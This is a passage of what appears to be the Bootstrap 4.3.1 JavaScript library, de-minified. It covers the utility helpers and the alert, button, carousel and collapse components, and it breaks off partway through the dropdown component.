!(function (t, e) {
  "object" == typeof exports && "undefined" != typeof module
    ? e(exports, require("jquery"), require("popper.js"))
    : "function" == typeof define && define.amd
    ? define(["exports", "jquery", "popper.js"], e)
    : e(((t = t || self).bootstrap = {}), t.jQuery, t.Popper);
})(this, function (t, e, n) {
  "use strict";
  function i(t, e) {
    for (var n = 0; n < e.length; n++) {
      var i = e[n];
      (i.enumerable = i.enumerable || !1),
        (i.configurable = !0),
        "value" in i && (i.writable = !0),
        Object.defineProperty(t, i.key, i);
    }
  }
  function r(t, e, n) {
    return e && i(t.prototype, e), n && i(t, n), t;
  }
  function s(t, e, n) {
    return (
      e in t
        ? Object.defineProperty(t, e, {
            value: n,
            enumerable: !0,
            configurable: !0,
            writable: !0,
          })
        : (t[e] = n),
      t
    );
  }
  function o(t) {
    for (var e = 1; e < arguments.length; e++) {
      var n = null != arguments[e] ? arguments[e] : {},
        i = Object.keys(n);
      "function" == typeof Object.getOwnPropertySymbols &&
        (i = i.concat(
          Object.getOwnPropertySymbols(n).filter(function (t) {
            return Object.getOwnPropertyDescriptor(n, t).enumerable;
          })
        )),
        i.forEach(function (e) {
          s(t, e, n[e]);
        });
    }
    return t;
  }
  (e = e && e.hasOwnProperty("default") ? e.default : e),
    (n = n && n.hasOwnProperty("default") ? n.default : n);
  var a = "transitionend";
  function l(t) {
    return {}.toString
      .call(t)
      .match(/\s([a-z]+)/i)[1]
      .toLowerCase();
  }
  var c = {
    TRANSITION_END: "bsTransitionEnd",
    getUID: function t(e) {
      do e += ~~(1e6 * Math.random());
      while (document.getElementById(e));
      return e;
    },
    getSelectorFromElement: function t(e) {
      var n = e.getAttribute("data-target");
      if (!n || "#" === n) {
        var i = e.getAttribute("href");
        n = i && "#" !== i ? i.trim() : "";
      }
      try {
        return document.querySelector(n) ? n : null;
      } catch (r) {
        return null;
      }
    },
    getTransitionDurationFromElement: function t(n) {
      if (!n) return 0;
      var i = e(n).css("transition-duration"),
        r = e(n).css("transition-delay"),
        s = parseFloat(i),
        o = parseFloat(r);
      return s || o
        ? ((i = i.split(",")[0]),
          (r = r.split(",")[0]),
          (parseFloat(i) + parseFloat(r)) * 1e3)
        : 0;
    },
    reflow: function t(e) {
      return e.offsetHeight;
    },
    triggerTransitionEnd: function t(n) {
      e(n).trigger(a);
    },
    supportsTransitionEnd: function t() {
      return Boolean(a);
    },
    isElement: function t(e) {
      return (e[0] || e).nodeType;
    },
    typeCheckConfig: function t(e, n, i) {
      for (var r in i)
        if (Object.prototype.hasOwnProperty.call(i, r)) {
          var s = i[r],
            o = n[r],
            a = o && c.isElement(o) ? "element" : l(o);
          if (!RegExp(s).test(a))
            throw Error(
              e.toUpperCase() +
                ": " +
                ('Option "' + r + '" provided type "') +
                a +
                '" but expected type "' +
                s +
                '".'
            );
        }
    },
    findShadowRoot: function t(e) {
      if (!document.documentElement.attachShadow) return null;
      if ("function" == typeof e.getRootNode) {
        var n = e.getRootNode();
        return n instanceof ShadowRoot ? n : null;
      }
      return e instanceof ShadowRoot
        ? e
        : e.parentNode
        ? c.findShadowRoot(e.parentNode)
        : null;
    },
  };
  (e.fn.emulateTransitionEnd = function t(n) {
    var i = this,
      r = !1;
    return (
      e(this).one(c.TRANSITION_END, function () {
        r = !0;
      }),
      setTimeout(function () {
        r || c.triggerTransitionEnd(i);
      }, n),
      this
    );
  }),
    (e.event.special[c.TRANSITION_END] = {
      bindType: a,
      delegateType: a,
      handle: function t(n) {
        if (e(n.target).is(this))
          return n.handleObj.handler.apply(this, arguments);
      },
    });
  var h = "alert",
    u = "bs.alert",
    f = "." + u,
    d = e.fn[h],
    g = {
      CLOSE: "close" + f,
      CLOSED: "closed" + f,
      CLICK_DATA_API: "click" + f + ".data-api",
    },
    m = { ALERT: "alert", FADE: "fade", SHOW: "show" },
    p = (function () {
      function t(t) {
        this._element = t;
      }
      var n = t.prototype;
      return (
        (n.close = function t(e) {
          var n = this._element;
          e && (n = this._getRootElement(e)),
            !this._triggerCloseEvent(n).isDefaultPrevented() &&
              this._removeElement(n);
        }),
        (n.dispose = function t() {
          e.removeData(this._element, u), (this._element = null);
        }),
        (n._getRootElement = function t(n) {
          var i = c.getSelectorFromElement(n),
            r = !1;
          return (
            i && (r = document.querySelector(i)),
            r || (r = e(n).closest("." + m.ALERT)[0]),
            r
          );
        }),
        (n._triggerCloseEvent = function t(n) {
          var i = e.Event(g.CLOSE);
          return e(n).trigger(i), i;
        }),
        (n._removeElement = function t(n) {
          var i = this;
          if ((e(n).removeClass(m.SHOW), !e(n).hasClass(m.FADE))) {
            this._destroyElement(n);
            return;
          }
          var r = c.getTransitionDurationFromElement(n);
          e(n)
            .one(c.TRANSITION_END, function (t) {
              return i._destroyElement(n, t);
            })
            .emulateTransitionEnd(r);
        }),
        (n._destroyElement = function t(n) {
          e(n).detach().trigger(g.CLOSED).remove();
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this),
              r = n.data(u);
            r || ((r = new t(this)), n.data(u, r)), "close" === i && r[i](this);
          });
        }),
        (t._handleDismiss = function t(e) {
          return function (t) {
            t && t.preventDefault(), e.close(this);
          };
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
        ]),
        t
      );
    })();
  e(document).on(
    g.CLICK_DATA_API,
    '[data-dismiss="alert"]',
    p._handleDismiss(new p())
  ),
    (e.fn[h] = p._jQueryInterface),
    (e.fn[h].Constructor = p),
    (e.fn[h].noConflict = function () {
      return (e.fn[h] = d), p._jQueryInterface;
    });
  var E = "button",
    v = "bs.button",
    T = "." + v,
    S = ".data-api",
    I = e.fn[E],
    A = { ACTIVE: "active", BUTTON: "btn", FOCUS: "focus" },
    C = {
      DATA_TOGGLE_CARROT: '[data-toggle^="button"]',
      DATA_TOGGLE: '[data-toggle="buttons"]',
      INPUT: 'input:not([type="hidden"])',
      ACTIVE: ".active",
      BUTTON: ".btn",
    },
    D = {
      CLICK_DATA_API: "click" + T + S,
      FOCUS_BLUR_DATA_API: "focus" + T + S + " blur" + T + S,
    },
    O = (function () {
      function t(t) {
        this._element = t;
      }
      var n = t.prototype;
      return (
        (n.toggle = function t() {
          var n = !0,
            i = !0,
            r = e(this._element).closest(C.DATA_TOGGLE)[0];
          if (r) {
            var s = this._element.querySelector(C.INPUT);
            if (s) {
              if ("radio" === s.type) {
                if (s.checked && this._element.classList.contains(A.ACTIVE))
                  n = !1;
                else {
                  var o = r.querySelector(C.ACTIVE);
                  o && e(o).removeClass(A.ACTIVE);
                }
              }
              if (n) {
                if (
                  s.hasAttribute("disabled") ||
                  r.hasAttribute("disabled") ||
                  s.classList.contains("disabled") ||
                  r.classList.contains("disabled")
                )
                  return;
                (s.checked = !this._element.classList.contains(A.ACTIVE)),
                  e(s).trigger("change");
              }
              s.focus(), (i = !1);
            }
          }
          i &&
            this._element.setAttribute(
              "aria-pressed",
              !this._element.classList.contains(A.ACTIVE)
            ),
            n && e(this._element).toggleClass(A.ACTIVE);
        }),
        (n.dispose = function t() {
          e.removeData(this._element, v), (this._element = null);
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this).data(v);
            n || ((n = new t(this)), e(this).data(v, n)),
              "toggle" === i && n[i]();
          });
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
        ]),
        t
      );
    })();
  e(document)
    .on(D.CLICK_DATA_API, C.DATA_TOGGLE_CARROT, function (t) {
      t.preventDefault();
      var n = t.target;
      e(n).hasClass(A.BUTTON) || (n = e(n).closest(C.BUTTON)),
        O._jQueryInterface.call(e(n), "toggle");
    })
    .on(D.FOCUS_BLUR_DATA_API, C.DATA_TOGGLE_CARROT, function (t) {
      var n = e(t.target).closest(C.BUTTON)[0];
      e(n).toggleClass(A.FOCUS, /^focus(in)?$/.test(t.type));
    }),
    (e.fn[E] = O._jQueryInterface),
    (e.fn[E].Constructor = O),
    (e.fn[E].noConflict = function () {
      return (e.fn[E] = I), O._jQueryInterface;
    });
  var y = "carousel",
    N = "bs.carousel",
    b = "." + N,
    L = ".data-api",
    w = e.fn[y],
    P = {
      interval: 5e3,
      keyboard: !0,
      slide: !1,
      pause: "hover",
      wrap: !0,
      touch: !0,
    },
    H = {
      interval: "(number|boolean)",
      keyboard: "boolean",
      slide: "(boolean|string)",
      pause: "(string|boolean)",
      wrap: "boolean",
      touch: "boolean",
    },
    R = { NEXT: "next", PREV: "prev", LEFT: "left", RIGHT: "right" },
    $ = {
      SLIDE: "slide" + b,
      SLID: "slid" + b,
      KEYDOWN: "keydown" + b,
      MOUSEENTER: "mouseenter" + b,
      MOUSELEAVE: "mouseleave" + b,
      TOUCHSTART: "touchstart" + b,
      TOUCHMOVE: "touchmove" + b,
      TOUCHEND: "touchend" + b,
      POINTERDOWN: "pointerdown" + b,
      POINTERUP: "pointerup" + b,
      DRAG_START: "dragstart" + b,
      LOAD_DATA_API: "load" + b + L,
      CLICK_DATA_API: "click" + b + L,
    },
    W = {
      CAROUSEL: "carousel",
      ACTIVE: "active",
      SLIDE: "slide",
      RIGHT: "carousel-item-right",
      LEFT: "carousel-item-left",
      NEXT: "carousel-item-next",
      PREV: "carousel-item-prev",
      ITEM: "carousel-item",
      POINTER_EVENT: "pointer-event",
    },
    k = {
      ACTIVE: ".active",
      ACTIVE_ITEM: ".active.carousel-item",
      ITEM: ".carousel-item",
      ITEM_IMG: ".carousel-item img",
      NEXT_PREV: ".carousel-item-next, .carousel-item-prev",
      INDICATORS: ".carousel-indicators",
      DATA_SLIDE: "[data-slide], [data-slide-to]",
      DATA_RIDE: '[data-ride="carousel"]',
    },
    V = { TOUCH: "touch", PEN: "pen" },
    U = (function () {
      function t(t, e) {
        (this._items = null),
          (this._interval = null),
          (this._activeElement = null),
          (this._isPaused = !1),
          (this._isSliding = !1),
          (this.touchTimeout = null),
          (this.touchStartX = 0),
          (this.touchDeltaX = 0),
          (this._config = this._getConfig(e)),
          (this._element = t),
          (this._indicatorsElement = this._element.querySelector(k.INDICATORS)),
          (this._touchSupported =
            "ontouchstart" in document.documentElement ||
            navigator.maxTouchPoints > 0),
          (this._pointerEvent = Boolean(
            window.PointerEvent || window.MSPointerEvent
          )),
          this._addEventListeners();
      }
      var n = t.prototype;
      return (
        (n.next = function t() {
          this._isSliding || this._slide(R.NEXT);
        }),
        (n.nextWhenVisible = function t() {
          !document.hidden &&
            e(this._element).is(":visible") &&
            "hidden" !== e(this._element).css("visibility") &&
            this.next();
        }),
        (n.prev = function t() {
          this._isSliding || this._slide(R.PREV);
        }),
        (n.pause = function t(e) {
          e || (this._isPaused = !0),
            this._element.querySelector(k.NEXT_PREV) &&
              (c.triggerTransitionEnd(this._element), this.cycle(!0)),
            clearInterval(this._interval),
            (this._interval = null);
        }),
        (n.cycle = function t(e) {
          e || (this._isPaused = !1),
            this._interval &&
              (clearInterval(this._interval), (this._interval = null)),
            this._config.interval &&
              !this._isPaused &&
              (this._interval = setInterval(
                (document.visibilityState
                  ? this.nextWhenVisible
                  : this.next
                ).bind(this),
                this._config.interval
              ));
        }),
        (n.to = function t(n) {
          var i = this;
          this._activeElement = this._element.querySelector(k.ACTIVE_ITEM);
          var r = this._getItemIndex(this._activeElement);
          if (!(n > this._items.length - 1) && !(n < 0)) {
            if (this._isSliding) {
              e(this._element).one($.SLID, function () {
                return i.to(n);
              });
              return;
            }
            if (r === n) {
              this.pause(), this.cycle();
              return;
            }
            var s = n > r ? R.NEXT : R.PREV;
            this._slide(s, this._items[n]);
          }
        }),
        (n.dispose = function t() {
          e(this._element).off(b),
            e.removeData(this._element, N),
            (this._items = null),
            (this._config = null),
            (this._element = null),
            (this._interval = null),
            (this._isPaused = null),
            (this._isSliding = null),
            (this._activeElement = null),
            (this._indicatorsElement = null);
        }),
        (n._getConfig = function t(e) {
          return (e = o({}, P, e)), c.typeCheckConfig(y, e, H), e;
        }),
        (n._handleSwipe = function t() {
          var e = Math.abs(this.touchDeltaX);
          if (!(e <= 40)) {
            var n = e / this.touchDeltaX;
            n > 0 && this.prev(), n < 0 && this.next();
          }
        }),
        (n._addEventListeners = function t() {
          var n = this;
          this._config.keyboard &&
            e(this._element).on($.KEYDOWN, function (t) {
              return n._keydown(t);
            }),
            "hover" === this._config.pause &&
              e(this._element)
                .on($.MOUSEENTER, function (t) {
                  return n.pause(t);
                })
                .on($.MOUSELEAVE, function (t) {
                  return n.cycle(t);
                }),
            this._config.touch && this._addTouchEventListeners();
        }),
        (n._addTouchEventListeners = function t() {
          var n = this;
          if (this._touchSupported) {
            var i = function t(e) {
                n._pointerEvent && V[e.originalEvent.pointerType.toUpperCase()]
                  ? (n.touchStartX = e.originalEvent.clientX)
                  : n._pointerEvent ||
                    (n.touchStartX = e.originalEvent.touches[0].clientX);
              },
              r = function t(e) {
                e.originalEvent.touches && e.originalEvent.touches.length > 1
                  ? (n.touchDeltaX = 0)
                  : (n.touchDeltaX =
                      e.originalEvent.touches[0].clientX - n.touchStartX);
              },
              s = function t(e) {
                n._pointerEvent &&
                  V[e.originalEvent.pointerType.toUpperCase()] &&
                  (n.touchDeltaX = e.originalEvent.clientX - n.touchStartX),
                  n._handleSwipe(),
                  "hover" === n._config.pause &&
                    (n.pause(),
                    n.touchTimeout && clearTimeout(n.touchTimeout),
                    (n.touchTimeout = setTimeout(function (t) {
                      return n.cycle(t);
                    }, 500 + n._config.interval)));
              };
            e(this._element.querySelectorAll(k.ITEM_IMG)).on(
              $.DRAG_START,
              function (t) {
                return t.preventDefault();
              }
            ),
              this._pointerEvent
                ? (e(this._element).on($.POINTERDOWN, function (t) {
                    return i(t);
                  }),
                  e(this._element).on($.POINTERUP, function (t) {
                    return s(t);
                  }),
                  this._element.classList.add(W.POINTER_EVENT))
                : (e(this._element).on($.TOUCHSTART, function (t) {
                    return i(t);
                  }),
                  e(this._element).on($.TOUCHMOVE, function (t) {
                    return r(t);
                  }),
                  e(this._element).on($.TOUCHEND, function (t) {
                    return s(t);
                  }));
          }
        }),
        (n._keydown = function t(e) {
          if (!/input|textarea/i.test(e.target.tagName))
            switch (e.which) {
              case 37:
                e.preventDefault(), this.prev();
                break;
              case 39:
                e.preventDefault(), this.next();
            }
        }),
        (n._getItemIndex = function t(e) {
          return (
            (this._items =
              e && e.parentNode
                ? [].slice.call(e.parentNode.querySelectorAll(k.ITEM))
                : []),
            this._items.indexOf(e)
          );
        }),
        (n._getItemByDirection = function t(e, n) {
          var i = e === R.NEXT,
            r = e === R.PREV,
            s = this._getItemIndex(n),
            o = this._items.length - 1;
          if (((r && 0 === s) || (i && s === o)) && !this._config.wrap)
            return n;
          var a = (s + (e === R.PREV ? -1 : 1)) % this._items.length;
          return -1 === a
            ? this._items[this._items.length - 1]
            : this._items[a];
        }),
        (n._triggerSlideEvent = function t(n, i) {
          var r = this._getItemIndex(n),
            s = this._getItemIndex(this._element.querySelector(k.ACTIVE_ITEM)),
            o = e.Event($.SLIDE, {
              relatedTarget: n,
              direction: i,
              from: s,
              to: r,
            });
          return e(this._element).trigger(o), o;
        }),
        (n._setActiveIndicatorElement = function t(n) {
          if (this._indicatorsElement) {
            e(
              [].slice.call(this._indicatorsElement.querySelectorAll(k.ACTIVE))
            ).removeClass(W.ACTIVE);
            var i = this._indicatorsElement.children[this._getItemIndex(n)];
            i && e(i).addClass(W.ACTIVE);
          }
        }),
        (n._slide = function t(n, i) {
          var r,
            s,
            o,
            a = this,
            l = this._element.querySelector(k.ACTIVE_ITEM),
            h = this._getItemIndex(l),
            u = i || (l && this._getItemByDirection(n, l)),
            f = this._getItemIndex(u),
            d = Boolean(this._interval);
          if (
            (n === R.NEXT
              ? ((r = W.LEFT), (s = W.NEXT), (o = R.LEFT))
              : ((r = W.RIGHT), (s = W.PREV), (o = R.RIGHT)),
            u && e(u).hasClass(W.ACTIVE))
          ) {
            this._isSliding = !1;
            return;
          }
          if (!this._triggerSlideEvent(u, o).isDefaultPrevented() && l && u) {
            (this._isSliding = !0),
              d && this.pause(),
              this._setActiveIndicatorElement(u);
            var g = e.Event($.SLID, {
              relatedTarget: u,
              direction: o,
              from: h,
              to: f,
            });
            if (e(this._element).hasClass(W.SLIDE)) {
              e(u).addClass(s), c.reflow(u), e(l).addClass(r), e(u).addClass(r);
              var m = parseInt(u.getAttribute("data-interval"), 10);
              m
                ? ((this._config.defaultInterval =
                    this._config.defaultInterval || this._config.interval),
                  (this._config.interval = m))
                : (this._config.interval =
                    this._config.defaultInterval || this._config.interval);
              var p = c.getTransitionDurationFromElement(l);
              e(l)
                .one(c.TRANSITION_END, function () {
                  e(u)
                    .removeClass(r + " " + s)
                    .addClass(W.ACTIVE),
                    e(l).removeClass(W.ACTIVE + " " + s + " " + r),
                    (a._isSliding = !1),
                    setTimeout(function () {
                      return e(a._element).trigger(g);
                    }, 0);
                })
                .emulateTransitionEnd(p);
            } else
              e(l).removeClass(W.ACTIVE),
                e(u).addClass(W.ACTIVE),
                (this._isSliding = !1),
                e(this._element).trigger(g);
            d && this.cycle();
          }
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this).data(N),
              r = o({}, P, e(this).data());
            "object" == typeof i && (r = o({}, r, i));
            var s = "string" == typeof i ? i : r.slide;
            if (
              (n || ((n = new t(this, r)), e(this).data(N, n)),
              "number" == typeof i)
            )
              n.to(i);
            else if ("string" == typeof s) {
              if (void 0 === n[s])
                throw TypeError('No method named "' + s + '"');
              n[s]();
            } else r.interval && r.ride && (n.pause(), n.cycle());
          });
        }),
        (t._dataApiClickHandler = function n(i) {
          var r = c.getSelectorFromElement(this);
          if (r) {
            var s = e(r)[0];
            if (s && e(s).hasClass(W.CAROUSEL)) {
              var a = o({}, e(s).data(), e(this).data()),
                l = this.getAttribute("data-slide-to");
              l && (a.interval = !1),
                t._jQueryInterface.call(e(s), a),
                l && e(s).data(N).to(l),
                i.preventDefault();
            }
          }
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
          {
            key: "Default",
            get: function t() {
              return P;
            },
          },
        ]),
        t
      );
    })();
  e(document).on($.CLICK_DATA_API, k.DATA_SLIDE, U._dataApiClickHandler),
    e(window).on($.LOAD_DATA_API, function () {
      for (
        var t = [].slice.call(document.querySelectorAll(k.DATA_RIDE)),
          n = 0,
          i = t.length;
        n < i;
        n++
      ) {
        var r = e(t[n]);
        U._jQueryInterface.call(r, r.data());
      }
    }),
    (e.fn[y] = U._jQueryInterface),
    (e.fn[y].Constructor = U),
    (e.fn[y].noConflict = function () {
      return (e.fn[y] = w), U._jQueryInterface;
    });
  var F = "collapse",
    M = "bs.collapse",
    j = "." + M,
    _ = e.fn[F],
    G = { toggle: !0, parent: "" },
    B = { toggle: "boolean", parent: "(string|element)" },
    K = {
      SHOW: "show" + j,
      SHOWN: "shown" + j,
      HIDE: "hide" + j,
      HIDDEN: "hidden" + j,
      CLICK_DATA_API: "click" + j + ".data-api",
    },
    x = {
      SHOW: "show",
      COLLAPSE: "collapse",
      COLLAPSING: "collapsing",
      COLLAPSED: "collapsed",
    },
    q = { WIDTH: "width", HEIGHT: "height" },
    Q = {
      ACTIVES: ".show, .collapsing",
      DATA_TOGGLE: '[data-toggle="collapse"]',
    },
    Y = (function () {
      function t(t, e) {
        (this._isTransitioning = !1),
          (this._element = t),
          (this._config = this._getConfig(e)),
          (this._triggerArray = [].slice.call(
            document.querySelectorAll(
              '[data-toggle="collapse"][href="#' +
                t.id +
                '"],[data-toggle="collapse"][data-target="#' +
                t.id +
                '"]'
            )
          ));
        for (
          var n = [].slice.call(document.querySelectorAll(Q.DATA_TOGGLE)),
            i = 0,
            r = n.length;
          i < r;
          i++
        ) {
          var s = n[i],
            o = c.getSelectorFromElement(s),
            a = [].slice
              .call(document.querySelectorAll(o))
              .filter(function (e) {
                return e === t;
              });
          null !== o &&
            a.length > 0 &&
            ((this._selector = o), this._triggerArray.push(s));
        }
        (this._parent = this._config.parent ? this._getParent() : null),
          this._config.parent ||
            this._addAriaAndCollapsedClass(this._element, this._triggerArray),
          this._config.toggle && this.toggle();
      }
      var n = t.prototype;
      return (
        (n.toggle = function t() {
          e(this._element).hasClass(x.SHOW) ? this.hide() : this.show();
        }),
        (n.show = function n() {
          var i,
            r,
            s = this;
          if (
            !(
              this._isTransitioning ||
              e(this._element).hasClass(x.SHOW) ||
              (this._parent &&
                0 ===
                  (i = [].slice
                    .call(this._parent.querySelectorAll(Q.ACTIVES))
                    .filter(function (t) {
                      return "string" == typeof s._config.parent
                        ? t.getAttribute("data-parent") === s._config.parent
                        : t.classList.contains(x.COLLAPSE);
                    })).length &&
                (i = null),
              i && (r = e(i).not(this._selector).data(M)) && r._isTransitioning)
            )
          ) {
            var o = e.Event(K.SHOW);
            if ((e(this._element).trigger(o), !o.isDefaultPrevented())) {
              i &&
                (t._jQueryInterface.call(e(i).not(this._selector), "hide"),
                r || e(i).data(M, null));
              var a = this._getDimension();
              e(this._element).removeClass(x.COLLAPSE).addClass(x.COLLAPSING),
                (this._element.style[a] = 0),
                this._triggerArray.length &&
                  e(this._triggerArray)
                    .removeClass(x.COLLAPSED)
                    .attr("aria-expanded", !0),
                this.setTransitioning(!0);
              var l = function t() {
                  e(s._element)
                    .removeClass(x.COLLAPSING)
                    .addClass(x.COLLAPSE)
                    .addClass(x.SHOW),
                    (s._element.style[a] = ""),
                    s.setTransitioning(!1),
                    e(s._element).trigger(K.SHOWN);
                },
                h = a[0].toUpperCase() + a.slice(1),
                u = c.getTransitionDurationFromElement(this._element);
              e(this._element).one(c.TRANSITION_END, l).emulateTransitionEnd(u),
                (this._element.style[a] = this._element["scroll" + h] + "px");
            }
          }
        }),
        (n.hide = function t() {
          var n = this;
          if (!this._isTransitioning && e(this._element).hasClass(x.SHOW)) {
            var i = e.Event(K.HIDE);
            if ((e(this._element).trigger(i), !i.isDefaultPrevented())) {
              var r = this._getDimension();
              (this._element.style[r] =
                this._element.getBoundingClientRect()[r] + "px"),
                c.reflow(this._element),
                e(this._element)
                  .addClass(x.COLLAPSING)
                  .removeClass(x.COLLAPSE)
                  .removeClass(x.SHOW);
              var s = this._triggerArray.length;
              if (s > 0)
                for (var o = 0; o < s; o++) {
                  var a = this._triggerArray[o],
                    l = c.getSelectorFromElement(a);
                  null !== l &&
                    (e([].slice.call(document.querySelectorAll(l))).hasClass(
                      x.SHOW
                    ) ||
                      e(a).addClass(x.COLLAPSED).attr("aria-expanded", !1));
                }
              this.setTransitioning(!0);
              var h = function t() {
                n.setTransitioning(!1),
                  e(n._element)
                    .removeClass(x.COLLAPSING)
                    .addClass(x.COLLAPSE)
                    .trigger(K.HIDDEN);
              };
              this._element.style[r] = "";
              var u = c.getTransitionDurationFromElement(this._element);
              e(this._element).one(c.TRANSITION_END, h).emulateTransitionEnd(u);
            }
          }
        }),
        (n.setTransitioning = function t(e) {
          this._isTransitioning = e;
        }),
        (n.dispose = function t() {
          e.removeData(this._element, M),
            (this._config = null),
            (this._parent = null),
            (this._element = null),
            (this._triggerArray = null),
            (this._isTransitioning = null);
        }),
        (n._getConfig = function t(e) {
          return (
            ((e = o({}, G, e)).toggle = Boolean(e.toggle)),
            c.typeCheckConfig(F, e, B),
            e
          );
        }),
        (n._getDimension = function t() {
          return e(this._element).hasClass(q.WIDTH) ? q.WIDTH : q.HEIGHT;
        }),
        (n._getParent = function n() {
          var i,
            r = this;
          c.isElement(this._config.parent)
            ? ((i = this._config.parent),
              void 0 !== this._config.parent.jquery &&
                (i = this._config.parent[0]))
            : (i = document.querySelector(this._config.parent));
          var s =
            '[data-toggle="collapse"][data-parent="' +
            this._config.parent +
            '"]';
          return (
            e([].slice.call(i.querySelectorAll(s))).each(function (e, n) {
              r._addAriaAndCollapsedClass(t._getTargetFromElement(n), [n]);
            }),
            i
          );
        }),
        (n._addAriaAndCollapsedClass = function t(n, i) {
          var r = e(n).hasClass(x.SHOW);
          i.length &&
            e(i).toggleClass(x.COLLAPSED, !r).attr("aria-expanded", r);
        }),
        (t._getTargetFromElement = function t(e) {
          var n = c.getSelectorFromElement(e);
          return n ? document.querySelector(n) : null;
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this),
              r = n.data(M),
              s = o({}, G, n.data(), "object" == typeof i && i ? i : {});
            if (
              (!r && s.toggle && /show|hide/.test(i) && (s.toggle = !1),
              r || ((r = new t(this, s)), n.data(M, r)),
              "string" == typeof i)
            ) {
              if (void 0 === r[i])
                throw TypeError('No method named "' + i + '"');
              r[i]();
            }
          });
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
          {
            key: "Default",
            get: function t() {
              return G;
            },
          },
        ]),
        t
      );
    })();
  e(document).on(K.CLICK_DATA_API, Q.DATA_TOGGLE, function (t) {
    "A" === t.currentTarget.tagName && t.preventDefault();
    var n = e(this),
      i = c.getSelectorFromElement(this);
    e([].slice.call(document.querySelectorAll(i))).each(function () {
      var t = e(this),
        i = t.data(M) ? "toggle" : n.data();
      Y._jQueryInterface.call(t, i);
    });
  }),
    (e.fn[F] = Y._jQueryInterface),
    (e.fn[F].Constructor = Y),
    (e.fn[F].noConflict = function () {
      return (e.fn[F] = _), Y._jQueryInterface;
    });
  var X = "dropdown",
    z = "bs.dropdown",
    J = "." + z,
    Z = ".data-api",
    tt = e.fn[X],
    te = RegExp("38|40|27"),
    tn = {
      HIDE: "hide" + J,
      HIDDEN: "hidden" + J,
      SHOW: "show" + J,
      SHOWN: "shown" + J,
      CLICK: "click" + J,
      CLICK_DATA_API: "click" + J + Z,
      KEYDOWN_DATA_API: "keydown" + J + Z,
      KEYUP_DATA_API: "keyup" + J + Z,
    },
    ti = {
      DISABLED: "disabled",
      SHOW: "show",
      DROPUP: "dropup",
      DROPRIGHT: "dropright",
      DROPLEFT: "dropleft",
      MENURIGHT: "dropdown-menu-right",
      MENULEFT: "dropdown-menu-left",
      POSITION_STATIC: "position-static",
    },
    tr = {
      DATA_TOGGLE: '[data-toggle="dropdown"]',
      FORM_CHILD: ".dropdown form",
      MENU: ".dropdown-menu",
      NAVBAR_NAV: ".navbar-nav",
      VISIBLE_ITEMS:
        ".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)",
    },
    ts = {
      TOP: "top-start",
      TOPEND: "top-end",
      BOTTOM: "bottom-start",
      BOTTOMEND: "bottom-end",
      RIGHT: "right-start",
      RIGHTEND: "right-end",
      LEFT: "left-start",
      LEFTEND: "left-end",
    },
    to = {
      offset: 0,
      flip: !0,
      boundary: "scrollParent",
      reference: "toggle",
      display: "dynamic",
    },
    ta = {
      offset: "(number|string|function)",
      flip: "boolean",
      boundary: "(string|element)",
      reference: "(string|element)",
      display: "string",
    },
    tl = (function () {
      function t(t, e) {
        (this._element = t),
          (this._popper = null),
          (this._config = this._getConfig(e)),
          (this._menu = this._getMenuElement()),
          (this._inNavbar = this._detectNavbar()),
          this._addEventListeners();
      }
      var i = t.prototype;
      return (
        (i.toggle = function i() {
          if (
            !(this._element.disabled || e(this._element).hasClass(ti.DISABLED))
          ) {
            var r = t._getParentFromElement(this._element),
              s = e(this._menu).hasClass(ti.SHOW);
            if ((t._clearMenus(), !s)) {
              var o = { relatedTarget: this._element },
                a = e.Event(tn.SHOW, o);
              if ((e(r).trigger(a), !a.isDefaultPrevented())) {
                if (!this._inNavbar) {
                  if (void 0 === n)
                    throw TypeError(
                      "Bootstrap's dropdowns require Popper.js (https://popper.js.org/)"
                    );
                  var l = this._element;
                  "parent" === this._config.reference
                    ? (l = r)
                    : c.isElement(this._config.reference) &&
                      ((l = this._config.reference),
                      void 0 !== this._config.reference.jquery &&
                        (l = this._config.reference[0])),
                    "scrollParent" !== this._config.boundary &&
                      e(r).addClass(ti.POSITION_STATIC),
                    (this._popper = new n(
                      l,
                      this._menu,
                      this._getPopperConfig()
                    ));
                }
                "ontouchstart" in document.documentElement &&
                  0 === e(r).closest(tr.NAVBAR_NAV).length &&
                  e(document.body).children().on("mouseover", null, e.noop),
                  this._element.focus(),
                  this._element.setAttribute("aria-expanded", !0),
                  e(this._menu).toggleClass(ti.SHOW),
                  e(r).toggleClass(ti.SHOW).trigger(e.Event(tn.SHOWN, o));
              }
            }
          }
        }),
        (i.show = function n() {
          if (
            !(
              this._element.disabled ||
              e(this._element).hasClass(ti.DISABLED) ||
              e(this._menu).hasClass(ti.SHOW)
            )
          ) {
            var i = { relatedTarget: this._element },
              r = e.Event(tn.SHOW, i),
              s = t._getParentFromElement(this._element);
            e(s).trigger(r),
              !r.isDefaultPrevented() &&
                (e(this._menu).toggleClass(ti.SHOW),
                e(s).toggleClass(ti.SHOW).trigger(e.Event(tn.SHOWN, i)));
          }
        }),
        (i.hide = function n() {
          if (
            !(
              this._element.disabled || e(this._element).hasClass(ti.DISABLED)
            ) &&
            e(this._menu).hasClass(ti.SHOW)
          ) {
            var i = { relatedTarget: this._element },
              r = e.Event(tn.HIDE, i),
              s = t._getParentFromElement(this._element);
            e(s).trigger(r),
              !r.isDefaultPrevented() &&
                (e(this._menu).toggleClass(ti.SHOW),
                e(s).toggleClass(ti.SHOW).trigger(e.Event(tn.HIDDEN, i)));
          }
        }),
        (i.dispose = function t() {
          e.removeData(this._element, z),
            e(this._element).off(J),
            (this._element = null),
            (this._menu = null),
            null !== this._popper &&
              (this._popper.destroy(), (this._popper = null));
        }),
        (i.update = function t() {
          (this._inNavbar = this._detectNavbar()),
            null !== this._popper && this._popper.scheduleUpdate();
        }),
        (i._addEventListeners = function t() {
          var n = this;
          e(this._element).on(tn.CLICK, function (t) {
            t.preventDefault(), t.stopPropagation(), n.toggle();
          });
        }),
        (i._getConfig = function t(n) {
          return (
